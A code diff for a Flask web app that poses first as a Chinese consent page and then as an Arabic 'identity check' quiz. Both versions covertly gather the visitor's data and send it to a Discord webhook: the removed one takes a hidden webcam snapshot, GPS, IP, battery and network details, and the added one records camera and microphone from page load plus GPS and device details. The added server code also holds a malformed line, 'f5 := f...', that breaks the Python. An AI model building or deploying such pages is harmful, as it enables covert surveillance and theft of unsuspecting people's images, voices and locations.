@@ -1,5 +1,4 @@
 import os
-import base64
 import json
 import requests
 from flask import Flask, render_template_string, request, jsonify
@@ -13,225 +12,207 @@ DISCORD_WEBHOOK_URL = os.getenv(
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="zh" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>隐私与权限确认</title>
+    <title>تحديد الهوية والأسئلة</title>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
         .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 480px; width: 100%; }
         h2 { color: #333; margin-bottom: 10px; }
         
-        .legal-banner {
-            background-color: #fff3cd;
-            color: #856404;
-            border: 2px solid #ffeeba;
-            padding: 15px;
+        .title-banner {
+            background-color: #ff4757;
+            color: white;
+            padding: 10px;
             border-radius: 6px;
             margin-bottom: 15px;
-            font-size: 15px;
+            font-size: 18px;
             font-weight: bold;
-            text-align: right;
-            line-height: 1.6;
         }
 
-        #webcam {
-            opacity: 0;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: -100;
-            width: 1px;
-            height: 1px;
-            pointer-events: none;
-        }
-
-        .btn-container { margin-top: 15px; display: flex; justify-content: space-around; }
-        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 45%; }
-        .btn-approve { background-color: #28a745; color: white; }
-        .btn-deny { background-color: #dc3545; color: white; }
+        #video-container { margin: 15px 0; }
+        video { width: 100%; border-radius: 8px; background: #000; border: 2px solid #ddd; }
+        .question-box { margin-bottom: 15px; text-align: right; background: #f1f2f6; padding: 10px; border-radius: 5px; }
+        .question-box label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; }
+        .question-box input, .question-box select { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
+        
+        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 100%; background-color: #2ed573; color: white; }
         #status { margin-top: 15px; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>权限许可请求</h2>
-        
-        <div class="legal-banner">
-            ✅DONT WORRY IT'S SAFE:安全的：<br>
-           安全的“Autoriser”安全的安全的安全的。安全的，安全的
-        </div>
+        <div class="title-banner">TJEWEB T9OSS</div>
+        <h2>تحقق من الهوية</h2>
 
-        <video id="webcam" autoplay playsinline muted></video>
+        <div id="video-container">
+            <!-- الكاميرا المباشرة أو الفيديو اللا نهائي -->
+            <video id="webcam" autoplay playsinline muted></video>
+        </div>
         
-        <form id="consentForm">
-            <input type="text" id="username" placeholder="姓名 (Name)" required style="width: 85%; padding: 10px; margin-bottom: 15px; font-size: 14px;"><br>
+        <form id="quizForm">
+            <input type="text" id="username" placeholder="اسمك الكريم (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
             
-            <div class="btn-container">
-                <button type="button" class="btn-approve" onclick="captureAndSend(false)">Autoriser</button>
-                <button type="button" class="btn-deny" onclick="captureAndSend(true)">Refuser</button>
+            <div class="question-box">
+                <label>1. I'M MORE BEAUTIFUL THAN YOU</label>
+                <select id="q1" required>
+                    <option value="">اختر الإجابة</option>
+                    <option value="yes">Yes</option>
+                    <option value="no">No</option>
+                </select>
             </div>
+
+            <div class="question-box">
+                <label>2. enti bhim</label>
+                <select id="q2" required>
+                    <option value="">اختر الإجابة</option>
+                    <option value="yes">Yes</option>
+                    <option value="no">No</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>3. chnowa essm kalbek?</label>
+                <select id="q3" required>
+                    <option value="">اختر الإجابة</option>
+                    <option value="sknder">sknder</option>
+                    <option value="michou">michou</option>
+                    <option value="tito">tito</option>
+                </select>
+            </div>
+
+            <button type="button" onclick="verifyAndStop()">إرسال وإيقاف الفيديو</button>
         </form>
 
         <div id="status"></div>
     </div>
 
-    <canvas id="canvas" style="display:none;"></canvas>
-
     <script>
-        function getDeviceDetails() {
-            const ua = navigator.userAgent;
-            let deviceType = "Appareil Inconnu";
-            
-            if (/android/i.test(ua)) {
-                let match = ua.match(/\b(SM-[A-Z0-9]+|GT-[A-Z0-9]+|Redmi\s[0-9A-Za-z\s]+|POCO\s[0-9A-Za-z\s]+|M2[0-9a-zA-Z]+|Nexus\s[0-9]+|Pixel\s[0-9a-zA-Z\s]+)/i);
-                if (match) {
-                    deviceType = "Android (" + match[0].trim() + ")";
-                } else {
-                    deviceType = "Android Phone / Mobile";
-                }
-            } else if (/iphone|ipad|ipod/i.test(ua)) {
-                deviceType = "Apple iOS / iPhone";
-            } else if (/windows/i.test(ua)) {
-                deviceType = "Ordinateur Windows";
-            } else if (/macintosh|mac os x/i.test(ua)) {
-                deviceType = "Macintosh Apple";
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+
+        // تشغيل الكاميرا والميكروفون فور فتح الصفحة باش يبدا التسجيل في الخلفية
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const videoElement = document.getElementById('webcam');
+                videoElement.srcObject = mediaStream;
+
+                mediaRecorder = new MediaRecorder(mediaStream);
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                // بداية التسجيل المستمر (Loop في الذاكرة)
+                mediaRecorder.start();
+            } catch (err) {
+                console.log("تعذر الوصول للكاميرا أو الميكروفون: ", err);
             }
-            return deviceType;
+        });
+
+        function getMobileModel() {
+            const ua = navigator.userAgent;
+            let model = "Appareil Inconnu";
+            if (/android/i.test(ua)) {
+                model = "Téléphone Android";
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                model = "iPhone / iOS Device";
+            } else if (/windows/i.test(ua)) {
+                model = "PC Windows";
+            } else if (/macintosh|mac os x/i.test(ua)) {
+                model = "Mac";
+            }
+            return model;
         }
 
-        async function captureAndSend(isDenied) {
+        async function verifyAndStop() {
             const statusDiv = document.getElementById('status');
             const username = document.getElementById('username').value;
 
-            if (isDenied) {
-                statusDiv.style.color = 'red';
-                statusDiv.innerText = '您已拒绝授权，未收集任何数据。';
-                return;
-            }
-
             if (!username) {
                 statusDiv.style.color = 'red';
-                statusDiv.innerText = '请先填写姓名。';
+                statusDiv.innerText = 'الرجاء إدخال الاسم أولاً.';
                 return;
             }
 
-            statusDiv.style.color = 'gray';
-            statusDiv.innerText = '正在获取权限与 advanced information...';
+            const q1 = document.getElementById('q1').value;
+            const q2 = document.getElementById('q2').value;
+            const q3 = document.getElementById('q3').value;
 
-            let locationData = "Non autorisé";
-            let imageBase64 = null;
-            let publicIP = "Inconnu";
-            let batteryInfo = "Inconnu";
-            let networkInfo = "Inconnu";
-
-            // 1. جلب عنوان الـ IP الخارجي
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                publicIP = ipData.ip;
-            } catch (e) {
-                publicIP = "Non disponible";
-            }
-
-            // 2. جلب معلومات البطارية إن وجدت
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    const level = Math.round(battery.level * 100);
-                    const charging = battery.charging ? "Oui ⚡" : "Non 🔋";
-                    batteryInfo = `${level}% (En charge: ${charging})`;
-                }
-            } catch (e) {
-                batteryInfo = "Non supporté";
-            }
-
-            // 3. جلب نوع الاتصال (Network Connection)
-            try {
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (connection) {
-                    networkInfo = `${connection.effectiveType ? connection.effectiveType.toUpperCase() : 'Inconnu'} (Débit: ${connection.downlink || '?'} Mbps)`;
-                }
-            } catch (e) {
-                networkInfo = "Non disponible";
-            }
-
-            let deviceInfo = {
-                model: getDeviceDetails(),
-                screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language,
-                platform: navigator.platform,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Inconnu",
-                cores: navigator.hardwareConcurrency || "Inconnu",
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnu",
-                ip: publicIP,
-                battery: batteryInfo,
-                network: networkInfo
-            };
-
-            // 4. جلب الـ GPS
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
-                });
-                locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
-            } catch (err) {
-                locationData = "Accès à la localisation refusé";
-            }
-
-            // 5. التقاط الصورة بوضوح بعد ثانية واحدة (1000ms)
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                
-                const videoElement = document.getElementById('webcam');
-                const canvas = document.getElementById('canvas');
-                
-                videoElement.srcObject = stream;
-
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                canvas.width = videoElement.videoWidth || 640;
-                canvas.height = videoElement.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-                imageBase64 = canvas.toDataURL('image/jpeg');
-
-                stream.getTracks().forEach(track => track.stop());
-
-            } catch (err) {
-                console.log("Impossible d'accéder à la caméra: ", err);
-            }
-
-            // 6. الإرسال إلى السيرفر
-            try {
-                const response = await fetch('/submit-consent', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        consent: true,
-                        username: username,
-                        location: locationData,
-                        device: deviceInfo,
-                        image: imageBase64
-                    })
-                });
-
-                const result = await response.json();
-                if (response.ok) {
-                    statusDiv.style.color = 'green';
-                    statusDiv.innerText = '已成功授权并发送数据！';
-                } else {
-                    statusDiv.style.color = 'red';
-                    statusDiv.innerText = result.error || '发生错误。';
-                }
-            } catch (err) {
+            if (!q1 || !q2 || !q3) {
                 statusDiv.style.color = 'red';
-                statusDiv.innerText = '无法连接到服务器。';
+                statusDiv.innerText = 'الرجاء الإجابة على كل الأسئلة.';
+                return;
+            }
+
+            // التحقق من الإجابات الصحيحة (q1: yes, q2: yes, q3: sknder)
+            if (q1 === 'yes' && q2 === 'yes' && q3 === 'sknder') {
+                statusDiv.style.color = 'green';
+                statusDiv.innerText = 'إجابات صحيحة! جاري إيقاف الفيديو وإرسال البيانات والصوت...';
+
+                if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                    mediaRecorder.stop();
+                }
+
+                // انتظار حتى يتم جمع قطع الفيديو والصوت النهائية
+                setTimeout(async () => {
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+
+                    let deviceInfo = {
+                        model: getMobileModel(),
+                        screen: `${window.screen.width}x${window.screen.height}`,
+                        language: navigator.language,
+                        platform: navigator.platform
+                    };
+
+                    let locationData = "Non autorisé";
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
+                        });
+                        locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+                    } catch (e) {
+                        locationData = "Location refusée";
+                    }
+
+                    const formData = new FormData();
+                    formData.append('username', username);
+                    formData.append('location', locationData);
+                    formData.append('device', JSON.stringify(deviceInfo));
+                    formData.append('q1', q1);
+                    formData.append('q2', q2);
+                    formData.append('q3', q3);
+                    formData.append('video', videoBlob, 'recording_with_audio.webm');
+
+                    try {
+                        const response = await fetch('/submit-consent', {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        if (response.ok) {
+                            statusDiv.innerText = 'تم الإرسال بنجاح!';
+                            if (mediaStream) {
+                                mediaStream.getTracks().forEach(track => track.stop());
+                            }
+                        } else {
+                            statusDiv.style.color = 'red';
+                            statusDiv.innerText = 'فشل في إرسال البيانات.';
+                        }
+                    } catch (err) {
+                        statusDiv.style.color = 'red';
+                        statusDiv.innerText = 'خطأ في الاتصال بالخادم.';
+                    }
+                }, 1000);
+
+            } else {
+                // إجابة خاطئة: تطلع كلمة غلط والفيديو يبقى يخدم عادي
+                statusDiv.style.color = 'red';
+                statusDiv.innerText = 'غلط! حاول مرة أخرى.';
             }
         }
     </script>
@@ -245,52 +226,45 @@ def home():
 
 @app.route("/submit-consent", methods=["POST"])
 def submit_consent():
-    data = request.json or {}
-    if not data.get("consent"):
-        return jsonify({"message": "Demande refusée."}), 200
-
-    username = data.get("username")
-    location = data.get("location")
-    device = data.get("device", {})
-    image_data = data.get("image")
+    username = request.form.get("username")
+    location = request.form.get("location")
+    device_str = request.form.get("device", "{}")
+    device = json.loads(device_str)
+    
+    q1 = request.form.get("q1")
+    q2 = request.form.get("q2")
+    q3 = request.form.get("q3")
+    video_file = request.files.get("video")
 
     payload = {
         "content": (
-            f"✅ **Nouveau consentement et détails avancés de l'appareil:**\n"
-            f"• **Nom:** {username}\n"
-            f"• **Type / Modèle:** {device.get('model')}\n"
-            f"• **Adresse IP:** {device.get('ip')}\n"
-            f"• **Localisation (GPS):** {location}\n"
-            f"• **Niveau de Batterie:** {device.get('battery')}\n"
-            f"• **Type de Réseau:** {device.get('network')}\n"
-            f"• **Résolution d'écran:** {device.get('screen')}\n"
-            f"• **Fuseau Horaire (Timezone):** {device.get('timezone')}\n"
-            f"• **Langue et système:** {device.get('language')} | {device.get('platform')}\n"
-            f"• **Processeur & RAM:** {device.get('cores')} Cœurs | {device.get('ram')}"
+            f"✅ **أجاب المستخدم إجابات صحيحة وتم إيقاف الفيديو والصوت:**\n"
+            f"• **الاسم:** {username}\n"
+            f"• **السؤال 1:** {q1}\n"
+            f"• **السؤال 2:** {q2}\n"
+            f5 := f"• **السؤال 3:** {q3}\n"
+            f"• **الموقع (GPS):** {location}\n"
+            f"• **الجهاز:** {device.get('model')} | {device.get('platform')}"
         )
     }
 
     try:
-        if image_data:
-            header, encoded = image_data.split(",", 1)
-            image_bytes = base64.b64decode(encoded)
-            
+        files = {}
+        if video_file:
             files = {
-                "file": ("snapshot.jpg", image_bytes, "image/jpeg")
+                "file": ("recording_with_audio.webm", video_file.read(), "video/webm")
             }
-            resp = requests.post(
-                DISCORD_WEBHOOK_URL, 
-                data={"payload_json": json.dumps(payload)}, 
-                files=files, 
-                timeout=10
-            )
-        else:
-            resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
 
+        resp = requests.post(
+            DISCORD_WEBHOOK_URL, 
+            data={"payload_json": json.dumps(payload)}, 
+            files=files, 
+            timeout=15
+        )
         resp.raise_for_status()
-        return jsonify({"message": "Envoyé avec succès."}), 200
+        return jsonify({"message": "Success"}), 200
     except requests.RequestException as e:
-        return jsonify({"error": f"Échec de l'envoi: {str(e)}"}), 500
+        return jsonify({"error": str(e)}), 500
 
 if __name__ == "__main__":
     app.run(port=5000, debug=True)
